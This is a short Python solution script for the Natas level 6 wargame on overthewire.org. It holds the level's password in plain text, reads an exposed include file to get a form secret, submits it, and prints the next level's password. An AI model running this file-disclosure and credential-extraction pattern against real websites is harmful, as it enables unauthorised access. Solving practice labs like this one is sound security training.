import requests
import re

username = "natas6"
password = "aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1"

url = 'http://{}.natas.labs.overthewire.org'.format(username)
url2 = url + "/includes/secret.inc"

r = requests.get(url2, auth=(username, password))
content = r.text

secret = re.findall('"(.*)"', content)[0]

r = requests.post(url, auth=(username, password), data={"submit": "", "secret": secret})
content=r.text

print("the password for next level = ", str(re.findall("The password for natas7 is (.*)", content)))
